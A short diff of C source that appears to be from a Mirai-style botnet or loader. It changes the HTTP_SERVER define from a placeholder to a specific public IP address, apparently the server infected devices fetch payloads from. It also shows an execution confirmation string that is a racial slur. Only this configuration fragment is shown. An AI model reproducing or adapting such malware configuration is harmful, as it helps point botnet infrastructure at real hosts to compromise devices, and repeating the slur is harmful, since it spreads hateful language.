@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(0,0,0,0) // REPLACE , FOR .
+#define HTTP_SERVER utils_inet_addr(5,181,80,188) // REPLACE , FOR .
 
 #define EXEC_MSG            "NIGGY\n"
 #define EXEC_MSG_LEN        6
